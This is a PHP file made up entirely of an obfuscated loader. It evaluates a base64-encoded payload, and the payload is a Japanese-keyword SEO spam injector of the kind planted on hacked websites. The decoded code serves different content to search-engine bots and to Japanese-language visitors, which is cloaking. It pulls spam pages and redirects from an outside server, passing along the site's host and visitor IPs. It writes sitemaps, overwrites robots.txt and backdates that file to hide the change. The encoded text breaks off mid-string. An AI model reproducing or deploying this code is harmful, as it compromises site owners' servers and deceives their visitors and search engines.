<?php $func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgCgpAaW5pX3NldCgnbWVtb3J5X2xpbWl0JywgJy0xJyk7CkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsKQHNldF90aW1lX2xpbWl0KDApOwpAZXJyb3JfcmVwb3J0aW5nKDApOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKCgppZiAoIWlzX2JvdCgpICYmICFpc19mcm9tX2JvdCgpKSB7CgogICAgcmV0dXJuOwp9CgppZiAoIWlzX2JvdCgpICYmICFpc19qcF9sYW5nKCkpIHsKICAgIHJldHVybjsKfQoKJHJlcXVlc3RVcmkgPSBnZXRfcmVxdWVzdF91cmkoKTsKCgoKaWYgKHByZWdfbWF0Y2goJy8tLWNoZWNrLWFsaXZlLS0vaXMnLCAkcmVxdWVzdFVyaSwgJHJlc3VsdHMpKSB7CiAgICBlY2hvICctLWFsaXZlLS0nOwogICAgZXhpdCgpOwp9ZWxzZSBpZihwcmVnX21hdGNoKCcvLS1zaXRlLW1hcC0tL2lzJywgJHJlcXVlc3RVcmksICRyZXN1bHRzKSl7CiAgICBnZXRfc2l0ZV9tYXAoKTsKICAgIGV4aXQoKTsKCn1lbHNlIGlmKHByZWdfbWF0Y2goJy8oXGR7NSx9KS9pcycsICRyZXF1ZXN0VXJpLCAkcmVzdWx0cykpewogICAgJGdldElkID0gJHJlc3VsdHNbMV07CiAgICAKCiAgIAogICAgZ2V0X2FydGljbGUoJGdldElkKTsKICAgIGV4aXQoKTsKCn1lbHNlewoKICAgICRnZXRJZCA9IGdldF9pZCgpOwogICAgZ2V0X2FydGljbGUoJGdldElkKTsKICAgIGV4aXQoKTsKfQoKCgpmdW5jdGlvbiBnZXRfYXBpX3VybCgpCnsKICAgIHJldHVybiAnaHR0cDovL3ByamNseW1maWphYmdqODguanBtYWxsLm9ubGluZS9ncm91cDEvanAtYXBpLnBocCc7Cn0KCgpmdW5jdGlvbiBnZXRfYXJ0aWNsZSgkaWQpCnsKICAgICRwcm9JZCA9Z2V0X251bSgpOwogICAgJGlkID0gJGlkLSRwcm9JZDsKCiAgICAkaHRtbCA9ICBnZXRfYXBpX3BhZ2UoZ2V0X2FwaV91cmwoKSAuICc/YWN0aW9uPWFydGljbGUmaWQ9JyAuICRpZCAuICcmaG9zdD0nIC4gZ2V0X2h0dHBfaG9zdCgpIC4gJyZpcD0nIC4gZ2V0X3JlYWxfaXAoKSAuICcmdGFpbD0nIC4gCgpnZXRfdGFpbCgpLiAnJnByb051bT0nIC4gZ2V0X251bSgpKTsKICAgIGlmIChzdHJpcG9zKCRodG1sLCAnNDA0JykgPT09IDApIHsKICAgICAgICAkZ2V0SWQgPSBnZXRfaWQoKS0kcHJvSWQ7CiAgICAgICAgaWYgKGlzX2JvdCgpKSB7CiAgICAgICAgICAgIAogICAgICAgICAgICBnZXRfYXJ0aWNsZSgkZ2V0SWQpOwogICAgICAgICAgICBleGl0KCk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIGdldF9qdW1wKCRnZXRJZCk7CiAgICAgICAgICAgIGV4aXQoKTsKICAgICAgICB9CiAgICB9ZWxzZXsKICAgICAgICBpZiAoaXNfYm90KCkpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgIGVjaG8gJGh0bWw7CiAgICAgICAgICAgIGV4aXQoKTsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgZ2V0X2p1bXAoJGlkKTsKICAgICAgICAgICAgZXhpdCgpOwogICAgICAgIH0KICAgIH0KICAgIGVjaG8gJGh0bWw7CiAgICBleGl0KCk7Cn0KCmZ1bmN0aW9uIGdldF9qdW1wKCRpZCkKewogICAgZWNobyBnZXRfYXBpX3BhZ2UoZ2V0X2FwaV91cmwoKSAuICc/YWN0aW9uPWp1bXAmaWQ9JyAuICRpZCAuICcmaG9zdD0nIC4gZ2V0X2h0dHBfaG9zdCgpIC4gJyZpcD0nIC4gZ2V0X3JlYWxfaXAoKSk7CiAgICBleGl0KCk7Cn0KCgoKZnVuY3Rpb24gZ2V0X3NpdGVfbWFwKCkKewoKICAgICR4bWxEaXIgPSAnc2l0ZW1hcCc7CiAgICBpZiAoIWZpbGVfZXhpc3RzKCR4bWxEaXIpKSB7CiAgICAgIG1rZGlyKCR4bWxEaXIpOwogICAgfQogICAgJHJlc3VsdHMgPSBnZXRfYXBpX3BhZ2UoZ2V0X2FwaV91cmwoKSAuICc/YWN0aW9uPXNpdGVtYXAmaG9zdD0nIC4gZ2V0X2h0dHBfaG9zdCgpIC4gJyZpcD0nIC4gZ2V0X3JlYWxfaXAoKSAuICcmdGFpbD0nIC4gZ2V0X3RhaWwoKS4gCgonJnByb051bT0nIC4gZ2V0X251bSgpKTsKCiAgICAkc2l0ZW1hcEFycmF5ID0ganNvbl9kZWNvZGUoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJHJlc3VsdHMpKSk7CgogICAgc2h1ZmZsZSgkc2l0ZW1hcEFycmF5KTsKCiAgICAkZGF0YUFycmF5ID0gYXJyYXlfY2h1bmsoJHNpdGVtYXBBcnJheSwgMTIwMDApOwogICAgJHJvYm90c1R4dCA9ICdVc2VyLWFnZW50OiAqJy4gUEhQX0VPTCAuJ0FsbG93OiAvJy4gUEhQX0VPTDsKICAgIAogICAKCiAgICBmb3JlYWNoICgkZGF0YUFycmF5IGFzICRkYXRhS2V5ID0+ICRkYXRhVmFsdWUpIHsKICAgICAgICAkeG1sQXJyYXkgPSBhcnJheV9zbGljZSgkZGF0YVZhbHVlLCAwLCBtdF9yYW5kKDgwMDAgLDEyMDAwKSk7CiAgICAgICAgJGxpbms9Jyc7CiAgICAgICAgJHVybCA9ICcnOwogICAgICAgICR4bWwgPSAnJzsKICAgICAgICBmb3JlYWNoICgkeG1sQXJyYXkgYXMgJHhtbEtleSA9PiAkeG1sVmFsdWUpIHsKICAgICAgICAgICAkdXJsIC49ICcgICAgPHVybD4KICAgIDxsb2M+JyAuICR4bWxWYWx1ZSAuICc8L2xvYz4KPC91cmw+Cic7CiAgICAgICAgJGxpbmsuPSAkeG1sVmFsdWUuIFBIUF9FT0w7CiAgICAgICAgCiAgICAgICAgfQoKICAgICAgICAkeG1sID0gJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+Cjx1cmxzZXQgeG1sbnM9Imh0dHA6Ly93d3cuc2l0ZW1hcHMub3JnL3NjaGVtYXMvc2l0ZW1hcC8wLjkiPgonOwogICAgICAgICR4bWwgLj0gJHVybDsKICAgICAgICAkeG1sIC49ICc8L3VybHNldD4nOwogICAgICAgICR4bWxGaWxlID0gJHhtbERpciAuICcvc2l0ZW1hcC1tJyAuICgkZGF0YUtleSsxKSAuICcueG1sJzsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkeG1sRmlsZSwgJHhtbCwgTE9DS19FWCk7CiAgICAgICAgJHVybEZpbGUgPSAkeG1sRGlyIC4gJy9zaXRlbWFwLW0nIC4gKCRkYXRhS2V5KzEpIC4gJy50eHQnOwogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCR1cmxGaWxlICwkbGluaywgTE9DS19FWCk7CiAgICAgICAgJGh0dHAgPSAnJzsKICAgICAgICBpZighaXNzZXQoJF9TRVJWRVJbJ0hUVFBTJ10pKXsKICAgICAgICAgICAgJGh0dHAgPSAnaHR0cDovLyc7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIGlmKCRfU0VSVkVSWydIVFRQUyddID09PSAxIHx8ICRfU0VSVkVSWydIVFRQUyddID09ICdvbicgfHwgJF9TRVJWRVJbJ1NFUlZFUl9QT1JUJ10gPT0gNDQzKXsKICAgICAgICAgICAgICAgICRodHRwID0gJ2h0dHBzOi8vJzsKICAgICAgICAgICAgfQogICAgICAgIH0KCgogICAgICAgIGVjaG8gJGh0dHAgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICcvc2l0ZW1hcC9zaXRlbWFwLW0nIC4gKCRkYXRhS2V5KzEpIC4gJy54bWwnIC4gJzxicj4nOwogICAgICAgIAogICAgICAgICRzaXRlbWFwVXJsID0gJGh0dHAgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICcvc2l0ZW1hcC9zaXRlbWFwLW0nIC4gKCRkYXRhS2V5KzEpIC4gJy54bWwnOwogICAgICAgICRyb2JvdHNUeHQgLj0gJ1NpdGVtYXA6ICcuJGh0dHAgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICcvc2l0ZW1hcC9zaXRlbWFwLW0nIC4gKCRkYXRhS2V5KzEpIC4gJy54bWwnIC4gUEhQX0VPTDsKICAgICAgICAKICAgICAgICBwaW5nX2dvb2dsZSgkc2l0ZW1hcFVybCk7CgogICAgfQogICAgCiAgICAkcm9ib3RzID0gZGlybmFtZShfX0ZJTEVfXykgLiAnL3JvYm90cy50eHQnOwogICAgZmlsZV9wdXRfY29udGVudHMoJHJvYm90cywkcm9ib3RzVHh0LCBMT0NLX0VYKTsKICAgIEB0b3VjaCgkcm9ib3RzLCBzdHJ0b3RpbWUoIi00MDAgZGF5cyIpKTsKICAgIGV4aXQoKTsKfQoKCgpmdW5jdGlvbiBwaW5nX2dvb2dsZSgkc2l0ZW1hcFVybCl7CgogICAgJHBpbmdVcmwgPSAnaHR0cDovL3d3dy5nb29nbGUuY29tL3dlYm1hc3RlcnMvdG9vbHMvcGluZz9zaXRlbWFwPScudXJsZW5jb2RlKCRzaXRlbWFwVXJsKTsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHBpbmdVcmwpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsgLy/miafooYxjdXJs6K+35rGCCiAgICAvL2VjaG8gJHJlc3VsdDsKICAgIGN1cmxfY2xvc2UoJGNoKTsKfQoKCmZ1bmN0aW9uIGdldF9pZCgpCnsKICAgICRiYWtEaXIgPSBkaXJuYW1lKF9fRklMRV9fKSAuICcvaW1hZ2VzJzsKICAgICRyZXF1ZXN0VXJpID0gZ2V0X3JlcXVlc3RfdXJpKCk7CiAgICAkc3RybGVuID0gc3RybGVuKCRyZXF1ZXN0VXJpKTsKICAgICRmaWxlUGF0aCA9ICRiYWtEaXIgLiAnLycgLiAkc3RybGVuIC4gJy8nLiBtZDUoJHJlcXVlc3RVcmkpIC4gJy5qcGcnOwoKICAgIGlmICghZmlsZV9leGlzdHMoZGlybmFtZSgkZmlsZVBhdGgpKSkgewogICAgICAgIG1rZGlyKGRpcm5hbWUoJGZpbGVQYXRoKSwgMDc3NywgdHJ1ZSk7CiAgICB9CgogICAgaWYgKCFmaWxlX2V4aXN0cygkZmlsZVBhdGgpKSB7CiAgICAgICAgJGdldElkID0gZ2V0X2FwaV9wYWdlKGdldF9hcGlfdXJsKCkgLiAnP2FjdGlvbj1nZXRpZCZob3N0PScgLiBnZXRfaHR0cF9ob3N0KCkgLiAnJmlwPScgLiBnZXRfcmVhbF9pcCgpLiAnJnByb051bT0nIC4gZ2V0X251bSgpKTsKICAgICAgICBpZiAoaXNfbnVtZXJpYygkZ2V0SWQpKSB7CiAgICAgICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlUGF0aCwgJGdldElkLCBMT0NLX0VYKTsKICAgICAgICB9CiAgICB9ZWxzZXsKICAgICAgICAkZ2V0SWQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZVBhdGgpOwogICAgfQogICAgcmV0dXJuICRnZXRJZDsKfQoKCgpmdW5jdGlvbiBnZXRfbnVtKCkKewogICAgJG51bURpciA9IGRpcm5hbWUoX19GSUxFX18pIC4gJy9pbWFnZXMnOwogICAgJG51bVR4dCA9ICRudW1EaXIgLiAnL251bS50eHQnOwoKICAgIGlmICghZmlsZV9leGlzdHMoJG51bURpcikpIHsKICAgICAgICBta2RpcigkbnVtRGlyLCAwNzc3LCB0cnVlKTsKICAgIH0KCiAgICBpZiAoZmlsZV9leGlzdHMoJG51bVR4dCkpIHsKICAgICAgICAkbnVtID0gdHJpbShmaWxlX2dldF9jb250ZW50cygkbnVtVHh0KSk7CiAgICB9ZWxzZXsKICAgICAgICAKICAgICAgICAkbnVtID0gbXRfcmFuZCg1MDAsNTAwMCk7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJG51bVR4dCwgJG51bSwgTE9DS19FWCk7CiAgICB9CgogICAgcmV0dXJuICRudW07Cn0KCgoKZnVuY3Rpb24gZ2V0X3RhaWwoKQp7CiAgICAkdGFpbERpciA9IGRpcm5hbWUoX19GSUxFX18pIC4gJy9pbWFnZXMnOwogICAgJHRhaWxUeHQgPSAkdGFpbERpciAuICcvdGFpbC50eHQnOwoKICAgIGlmICghZmlsZV9leGlzdHMoJHRhaWxEaXIpKSB7CiAgICAgICAgbWtkaXIoJHRhaWxEaXIsIDA3NzcsIHRydWUpOwogICAgfQoKICAgIGlmIChmaWxlX2V4aXN0cygkdGFpbFR4dCkpIHsKICAgICAgICAkdGFpbCA9IHRyaW0oZmlsZV9nZXRfY29udGVudHMoJHRhaWxUeHQpKTsKICAgIH1lbHNlewogICAgICAgICRzdHJzID0gJ0FCQ0RFRkdISUdLTE1OT1BRUlNUVVZXWllaYWJjZGVmZ2hpZ2tsbW5vcHFyc3R1dnd4eXonOwogICAgICAgICRzdHJzX2FycmF5ID0gc3RyX3NwbGl0KCRzdHJzKTsKICAgICAgICBzaHVmZmxlKCRzdHJzX2FycmF5KTsKICAgICAgICAkc3RyX2FycmF5ID0gYXJyYXlfc2xpY2UoJHN0cnNfYXJyYXksIDAsIG10X3JhbmQoMywgNCkpOwogICAgICAgICRzdHIgPSAnLicgLiBpbXBsb2RlKCRzdHJfYXJyYXkpOwoKICAgICAgICAkcmFuZG9tVGFpbEFycmF5ID0gW107CiAgICAgICAgJHJhbmRvbVRhaWxBcnJheVtdID0gJHN0cjsKICAgICAgICAkcmFuZG9tVGFpbEFycmF5W10gPSAnLyc7CiAgICAgICAgJHJhbmRvbVRhaWxBcnJheVtdID0gJy5odG1sJzsKICAgICAgICAkdGFpbCA9ICRyYW5kb21UYWlsQXJyYXlbbXRfcmFuZCgwLDIpXTsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkdGFpbFR4dCwgJHRhaWwsIExPQ0tfRVgpOwogICAgfQoKICAgIHJldHVybiAkdGFpbDsKfQoKCgoKZnVuY3Rpb24gZ2V0X2h0dHBfaG9zdCgpCnsKICAgICRodHRwID0gJyc7CiAgICBpZighaXNzZXQoJF9TRVJWRVJbJ0hUVFBTJ10pKXsKICAgICAgICAkaHR0cCA9ICdodHRwOi8vJzsKICAgIH1lbHNlewogICAgICAgIGlmKCRfU0VSVkVSWydIVFRQUyddID09PSAxIHx8ICRfU0VSVkVSWydIVFRQUyddID09ICdvbicgfHwgJF9TRVJWRVJbJ1NFUlZFUl9QT1JUJ10gPT0gNDQzKXsKICAgICAgICAgICAgJGh0dHAgPSAnaHR0cHM6Ly8nOwogICAgICAgIH0KICAgIH0KCiAgICBpZiAoaXNzZXQoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pKSB7CiAgICAgICAgJGhvc3QgPSAkaHR0cCAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwogICAgfWVsc2UgaWYoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSl7CiAgICAgICAgJGhvc3QgPSAkaHR0cCAuICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKICAgIH1lbHNlewogICAgICAgIHJldHVybiAnJzsKICAgIH0KCgogICAgcmV0dXJuICRob3N0OwoKCgp9CgpmdW5jdGlvbiBnZXRfcmVxdWVzdF91cmkoKQp7CiAgICBpZiAoaXNzZXQoJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pKSB7CiAgICAgICAgJHJlcXVlc3RVcmkgPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsKICAgIH1lbHNlewogICAgICAgICRyZXF1ZXN0VXJpID0gJyc7CiAgICB9CiAgICByZXR1cm4gJHJlcXVlc3RVcmk7Cn0KCgoKZnVuY3Rpb24gZ2V0X3VzZXJfYWdlbnQoKQp7CiAgICBpZiAoaXNzZXQoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdKSkgewogICAgICAgICR1c2VyQWdlbnQgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiAgICB9ZWxzZXsKICAgICAgICAkdXNlckFnZW50ID0gJyc7CiAgICB9CiAgICByZXR1cm4gJHVzZXJBZ2VudDsKfQoKZnVuY3Rpb24gZ2V0X3JlYWxfaXAoKQp7CiAgICAkaXAgPSBmYWxzZTsKICAgIGlmKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9DRl9DT05ORUNUSU5HX0lQJ10pKXsKICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ0hUVFBfQ0ZfQ09OTkVDVElOR19JUCddOwogICAgfQogICAgaWYoIWVtcHR5KCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX0ZPUiddKSl7CiAgICAgICAgJGlwcz1leHBsb2RlICgnLCcsICRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX0ZPUiddKTsKICAgICAgICBmb3IgKCRpPTA7ICRpIDwgY291bnQoJGlwcyk7ICRpKyspewogICAgICAgICAgICBpZighcHJlZ19tYXRjaCAoJ14oMTB8MTcyLjE2fDE5Mi4xNjgpLicsICRpcHNbJGldKSl7CiAgICAgICAgICAgICAgICAkaXA9JGlwc1skaV07CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkaXAgPyAkaXAgOiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsKfQoKCmZ1bmN0aW9uIGdldF9hcGlfcGFnZSgkdXJsKQp7CiAgICAkZmlsZV9jb250ZW50cyA9ICcnOwogICAgJHVzZXJfYWdlbnQgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzUxLjAuMjcwNC4xMDMgU2FmYXJpLzUzNy4zNic7CgoKICAgIGlmKGZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0JykpewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgICAgICR0aW1lb3V0ID0gMzA7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1VSTCwkdXJsKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwkdGltZW91dCk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1VTRVJBR0VOVCwkdXNlcl9hZ2VudCk7CiAgICAgICAgICAgICRmaWxlX2NvbnRlbnRzID0gY3VybF9leGVjKCAkY2gpOwogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gJGUpCiAgICAgICAge30KICAgIH0KCiAgICBpZihzdHJsZW4oJGZpbGVfY29udGVudHMpPDEmJmZ1bmN0aW9uX2V4aXN0cygnZmlsZV9nZXRfY29udGVudHMnKSl7CiAgICAgICAgaW5pX3NldCgndXNlcl9hZ2VudCcsJHVzZXJfYWdlbnQpOwogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJGZpbGVfY29udGVudHMgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7CgogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uICRlKQogICAgICAgIHt9CiAgICB9CgogICAgaWYoJGZpbGVfY29udGVudHMgPT0gJzUwMycgfHwgJGZpbGVfY29udGVudHMgPT0gJycpCiAgICB7CiAgICAgICAgZXJyb3JfNTAzKCk7CiAgICB9CgogICAgcmV0dXJuICRmaWxlX2NvbnRlbnRzOwp9CgpmdW5jdGlvbiBlcnJvcl81MDMoKQp7CiAgICBvYl9zdGFydCgpOwogICAgaGVhZGVyKCdIVFRQLzEuMSA1MDMgU2VydmljZSBUZW1wb3JhcmlseSBVbmF2YWlsYWJsZScpOwogICAgaGVhZGVyKCdTdGF0dXM6ICA1MDMgU2VydmljZSBUZW1wb3JhcmlseSBVbmF2YWlsYWJsZScpOwogICAgaGVhZGVyKCdSZXRyeS1BZnRlcjoxMjAwJyk7CiAgICBoZWFkZXIoJ1gtUG93ZXJlZC1CeTpBcGFjaGUnKTsKICAgIGV4aXQoKTsKfQoKCgpmdW5jdGlvbiBpc19ib3QoKQp7CiAgICAkdWEgPSBnZXRfdXNlcl9hZ2VudCgpOwogICAgJGlwID0gZ2V0X3JlYWxfaXAoKTsKCiAgICBpZihlbXB0eSgkdWEpKSByZXR1cm4gZmFsc2U7CgogICAgaWYoc3RyaXBvcygkdWEsIi0tc2Vlc2hvcC0tIikgPT09IDApIHJldHVybiB0cnVlOwoKICAgICRib3RfaXBfcG9vbCA9IGFycmF5KAogICAgICAgICI2NlwuMjQ5XC5bNi05XVswLTldXC5bMC05XSsiLCAgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDY2LjI0OS42NC4wIC0gNjYuMjQ5Ljk1LjI1NQogICAgICAgICI3NFwuMTI1XC5bMC05XStcLlswLTldKyIsICAvL0dvb2dsZSAgTmV0UmFuZ2U6ICAgNzQuMTI1LjAuMCAtIDc0LjEyNS4yNTUuMjU1CiAgICAgICAgIjY2XC4xMDJcLjZcLlswLTldKyIsIC8vR29vZ2xlICBOZXRSYW5nZTogICA2Ni4xMDIuNi4wIC0gNjYuMTAyLjYuMjU1CiAgICAgICAgIjY2XC4xMDJcLjdcLlswLTldKyIsIC8vR29vZ2xlICBOZXRSYW5nZTogICA2Ni4xMDIuNy4wIC0gNjYuMTAyLjcuMjU1CiAgICAgICAgIjY2XC4xMDJcLjhcLlswLTldKyIsIC8vR29vZ2xlICBOZXRSYW5nZTogICA2Ni4xMDIuOC4wIC0gNjYuMTAyLjguMjU1CiAgICAgICAgIjY2XC4xMDJcLjlcLlswLTldKyIsIC8vR29vZ2xlICBOZXRSYW5nZTogICA2Ni4xMDIuOS4wIC0gNjYuMTAyLjkuMjU1CiAgICAgICAgIjY0XC4yMzNcLjE3MlwuWzAtOV0rIiwgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDY0LjIzMy4xNzIuMCAtIDY0LjIzMy4xNzIuMjU1CiAgICAgICAgIjY0XC4yMzNcLjE3M1wuWzAtOV0rIiwgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDY0LjIzMy4xNzMuMCAtIDY0LjIzMy4xNzMuMjU1CiAgICAgICAgIjIzXC4yNTFcLjFbMi01XVswLTldXC5bMC05XSsiLCAvL0dvb2dsZSAgTmV0UmFuZ2U6ICAgMjMuMjUxLjEyOC4wIC0gMjMuMjUxLjE1OS4yNTUKICAgICAgICAiMjAzXC4yMDhcLjYwXC5bMC05XSsiLCAvL0dvb2dsZSAgTmV0UmFuZ2U6ICAgMjAzLjIwOC42MC4wIC0gMjAzLjIwOC42MC4yNTUKICAgICAgICAiMTczXC4yNTVcLjFbMS0yXVswLTldXC5bMC05XSsiLCAgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDE3My4yNTUuMTEyLjAgLSAxNzMuMjU1LjEyNy4yNTUKICAgICAgICAiMTQ2XC4xNDhcLlswLTldK1wuWzAtOV0rIiwgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDE0Ni4xNDguMC4wIC0gMTQ2LjE0OC4xMjcuMjU1CiAgICAgICAgIjIxNlwuMjM5XC40NVwuWzAtOV0rIiwgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDIxNi4yMzkuNDUuMCAtIDIxNi4yMzkuNDUuMjU1CiAgICAgICAgIjIxNlwuNThcLjE5WzItOV1cLlswLTldKyIsIC8vR29vZ2xlICBOZXRSYW5nZTogICAyMTYuNTguMTkyLjAgLSAyMTYuNTguMTk5LjI1NQogICAgICAgICIyMTZcLjU4XC4yWzAtMl1bMC05XVwuWzAtOV0rIiwgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDIxNi41OC4yMDAuMCAtIDIxNi41OC4yMjMuMjU1CiAgICAgICAgIjEzNlwuWzMtNl1bMC05XVwuWzAtOV0rXC5bMC05XSsiLCAgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDEzNi4zMi4wLjAgLSAxMzYuNjMuMjU1LjI1NQogICAgICAgICIxMzBcLjIxMVwuWzAtOV0rXC5bMC05XSsiLCAvL0dvb2dsZSAgTmV0UmFuZ2U6ICAgMTMwLjIxMS4wLjAgLSAxMzAuMjExLjI1NS4yNTUKICAgICAgICAiMTA3XC4xNzhcLjJbMC01XVswLTldXC5bMC05XSsiLCAgLy9Hb29nbGUgIE5ldFJhbmdlOiAgIDEwNy4xNzguMjAwLjAgLSAxMDcuMTc4LjI1NS4yNTUKICAgICAgICAiMTA0XC4xNVs0LTVdXC5bMC05XStcLlswLTldKyIsIC8vR29vZ2xlICBOZXRSYW5nZTogICAxMDQuMTU0LjAuMCAtIDEwNC4xNTUuMjU1LjI1NQogICAgICAgICIxMzFcLjI1M1wuWzEtM11bMC05XVwuWzAtOV0rIiwgLy9iaW5nICAgIE5ldFJhbmdlOiAxMzEuMjUzLjE0LjAgLSAxMzEuMjUzLjM4LjI1NQogICAgICAgICIxNTdcLjU1XC4yXC5bMC05XSsiLCAvL2JpbmcgICAgTmV0UmFuZ2U6IDE1Ny41NS4yLjAgLSAxNTcuNTUuMi4yNTUKICAgICAgICAiMTU3XC41NVwuWzEtNF1bMC05XVwuWzAtOV0rIiwgIC8vYmluZyAgICBOZXRSYW5nZTogMTU3LjU1LjEyLjAgLSAxNTcuNTUuNDkuMjU1CiAgICAgICAgIjE1N1wuNTZcLlswLTldK1wuWzAtOV0rIiwgIC8vYmluZyAgICBOZXRSYW5nZTogMTU3LjU2LjAuMCAtIDE1Ny41Ni4yNTUuMjU1CiAgICAgICAgIjE5OVwuMzBcLlsxLTNdWzAtOV1cLlswLTldKyIsICAvL2JpbmcgICAgTmV0UmFuZ2U6IDE5OS4zMC4xNi4wIC0gMTk5LjMwLjMxLjI1NQogICAgICAgICIyMDdcLjQ2XC5bMC05XStcLlswLTldKyIsICAvL2JpbmcgICAgTmV0UmFuZ2U6IDIwNy40Ni4wLjE1MSAtIDIwNy40Ni4yNTUuMjU1CiAgICAgICAgIjQwXC43N1wuMTY3XC5bMC05XSsiLCAgLy9iaW5nICAgIE5ldFJhbmdlOiA0MC43Ny4xNjcuMCAtIDQwLjc3LjE2Ny4yNTUKICAgICAgICAiNjVcLjVbMi01XVwuWzAtOV0rXC5bMC05XSsiLCAvL01TTiAgIE5ldFJhbmdlOiAgIDY1LjUyLjAuMCAtIDY1LjU1LjI1NS4yNTUKICAgICAgICAiNzRcLjZcLlswLTldK1wuWzAtOV0rIiwgIC8vWWFob28gICBOZXRSYW5nZTogICA3NC42LjAuMCAtIDc0LjYuMjU1LjI1NQogICAgICAgICI2N1wuMTk1XC5bMC05XStcLlswLTldKyIsICAvL1lhaG9vIzIgTmV0UmFuZ2U6ICAgNjcuMTk1LjAuMCAtIDY3LjE5NS4yNTUuMjU1CiAgICAgICAgIjY4XC4xODBcLjJbMS0yXVswLTldXC5bMC05XSsiLCAvL1lhaG9vICAgTmV0UmFuZ2U6ICAgNjguMTgwLjIxNi4wIC0gNjguMTgwLjIyOS4yMjUKICAgICAgICAiMjAyXC4xNjBcLjFbNy04XVswLTldXC5bMC05XSsiLCAgLy9ZYWhvbyAgIE5ldFJhbmdlOiAgIDIwMi4xNjAuMTc2LjAgLSAyMDIuMTYwLjE4OS4yNTUKICAgICAgICAiMjAzXC4yMDlcLjJbMi01XVswLTldXC5bMC05XSsiLCAgLy9ZYWhvbyAgIE5ldFJhbmdlOiAgIDIwMy4yMDkuMjI0LjAgLSAyMDMuMjA5LjI1My4yNTUKICAgICAgICAiMTgzXC43OVwuWzAtOV0rXC5bMC05XSsiLCAgLy9ZYWhvbyAgIE5ldFJhbmdlOiAgIDE4My43OS4wLjAgLSAxODMuNzkuMjU1LjI1NQogICAgICAgICI3MlwuMzBcLlswLTldK1wuWzAtOV0rIiAgLy9ZYWhvbyMzIE5ldFJhbmdlOiAgIDcyLjMwLjAuMCAtIDcyLjMwLjI1NS4yNTUKICAgICk7CgogICAgZm9yZWFjaCAoICRib3RfaXBfcG9vbCBhcyAkdiApCiAgICB7CiAgICAgICAgaWYgKCBwcmVnX21hdGNoKCAnI14nLiR2LickIycsICRpcCApKSByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAkYm90X2RuX3Bvb2wgPSBhcnJheSgiZ29vZ2xlIiwnLnlhaG9vLicsJy5saXZlLicsJy5tc24uJyk7CgogICA